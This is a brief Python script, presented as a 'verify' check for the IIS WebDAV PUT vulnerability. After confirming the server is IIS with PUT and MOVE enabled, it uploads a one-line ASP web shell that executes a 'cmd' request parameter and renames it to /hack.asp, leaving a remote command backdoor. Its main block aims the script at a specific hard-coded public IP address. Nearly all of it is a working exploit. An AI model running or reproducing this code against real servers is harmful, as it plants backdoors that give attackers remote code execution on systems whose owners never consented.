# -*- coding:utf-8 -*-

import sys
import http.client

def verify(protocol,ip,port):
    domain = protocol+'://'+ip+':'+str(port)
    print('testing if iis put file vul')
    try:
        url = ip+':'+str(port)
        conn = http.client.HTTPConnection(url)
        conn.request(method='OPTIONS', url='/')
        headers = dict(conn.getresponse().getheaders())
        if 'Microsoft-IIS' in headers['Server'] :
            pass
        else:
            msg = 'This is not an IIS web server'
            number = 'v0'
            return False,url,number,msg
        if 'public' in headers and headers['public'].find('PUT') > 0 and headers['public'].find('MOVE') > 0:
            conn.close()
            conn = http.client.HTTPConnection(url)
            conn.request( method='PUT', url='/hack.txt', body='<%execute(request("cmd"))%>' )
            conn.close()
            conn = http.client.HTTPConnection(url)
            conn.request(method='MOVE', url='/hack.txt', headers={'Destination': '/hack.asp'})
            msg = 'IIS web server has open iis put (webdav)'
            print(msg)
            number = 'v22'
            return True,domain,number,msg
        else:
            msg = 'Server not vulnerable'
            number = 'v0'
            return False,url,number,msg
    except Exception as e:
        msg = str(e)
        print(msg)
        number = 'v0'
        return False,url,number,msg

if __name__ == '__main__':
    res = verify('http','146.196.114.106',80)
    print(res)